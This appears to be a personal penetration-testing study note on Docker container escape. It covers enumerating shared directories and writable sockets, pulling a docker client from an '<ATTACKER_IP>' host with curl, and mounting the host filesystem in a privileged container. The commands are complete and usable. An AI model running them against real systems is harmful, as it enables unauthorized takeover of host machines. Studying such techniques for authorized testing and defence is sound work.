---
Primary_category: "[[LINUX PRIVESC]]"
title: "CONTAINERS ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *LXD | LXC*

##### *LXD Group*

> ***See [[LINUX PRIVILEGED GROUPS#LXC LXD|Linux Privileged Groups]]***

---

#### *Docker*

##### *Docker Shared Directories*

It's important to take into account the presence of *shared directories* or *volume mounts* within the container itself

This type of feature allows that specific directories or files in the host system are accesible from the container

So, a *system administrator* or *devops* could have set up a *shared directory* between the host system and the container during the creation of the latter

Therefore, let's suppose we have compromised a given web application and stablished a remote connection to the target through a ***[[SHELLS AND PAYLOADS#Reverse Shell|Reverse Shell]]***, let's say by leveraging an arbitrary ***[[FILE UPLOAD|File Upload]]***

In this case the web application was deployed using a *docker container*, so we have landed within a container file system

However, one of the first things we need to do from an attacker's perspective when enumerating a docker container is to look for non-standard directories, as these are likely to be *shared directories* between the host system or other containers and the container in question

So, we could start by listing the content of the container's *root* directory

```bash
ls -l /
```

Similarly, we could list a two-level structure of directories that we can access with the current user

```bash
find / -maxdepth 2 \( -path '/usr' -o -path '/opt' -o -path '/proc' \) -prune -o -perm -0001 -type d 2> /dev/null
```

##### *Docker Sockets*

###### *Enumeration*

Continuing with the previous example, imagine we do not find any *shared directories* within the *docker container*, the next thing we can try is to look for any existing *socket* in the container

We may find that the *Docker Daemon's Socket*is accesible from the container due to a misconfiguration or an oversight

If we have write permissions over the *socket*, we could use the *docker client* to send requests to the *Docker Daemon's API REST* through the socket in order to be able to create new containers or manage the existing ones

> ***We may have write permissions on the Docker Socket it the webapp runs as the container's ROOT user ( Host's Root ↔ UID 0 ↔ Container's Root )***

So first, we can proceed as follows to list the available sockets in the system

```bash
find / -type s -ls 2> /dev/null
```

We could refine the search a little further by issuing the following command

```bash
find / -type s -writable -ls 2> /dev/null
find / -iname '*docker*' -type s -writable -ls 2> /dev/null
```

Once we find out the given *Docket socket* for which we have write permissions, we should check if a *docker client* is available in the container, otherwise we would have to transfer one to the container

```bash
command -V docker
```

If there is no *docket client*, just proceed as follows

> ***From the Attacker***⚔️ 

```bash
curl --silent --location --request GET --remote-name 'https://master.dockerproject.com/linux/x86_64/docker'
```

```bash
python3 -m http.server 80
```

> ***From the Target*** 🎯

```bash
cd /dev/shm && curl --silent --location --request GET --remote-name 'http://<ATTACKER_IP>/docker'
```

```bash
chmod 700 ./docker && ./docker --version
```

###### *Abuse*

With a *docker client* available and write permissions over the *Docker Socket*, we could create a new *docker container* and set up a *bind mount* to make the host's file system accesible from the container in question

- ***Creating the Docker Container***

```bash
/dev/shm/docker --host unix:///app/docker.sock run --rm --detach --privileged --volume /:/hostsystem main_app
```

- ***Listing the existing Docker Containers***

```bash
/dev/shm/docker --host unix:///app/docker.sock ps
```

- ***Accessing the Host's Filesytem from the created Docker Container***

```bash
/dev/shm/docker --host unix:///app/docker.sock exec --interactive --tty <CONTAINER_ID> /bin/bash
```

> ***Inside the Docker Container***

```bash
cd /hostssystem
```

From here, we can perform any action to the host's file system i.e. we have compromised the entire machine and its containers

##### *Docker Group*

> ***See [[LINUX PRIVILEGED GROUPS#Docker|Linux Privileged Groups]]***

---

#### *K8S*

> ***See [[K8S Abuse|Abusing KS8]]***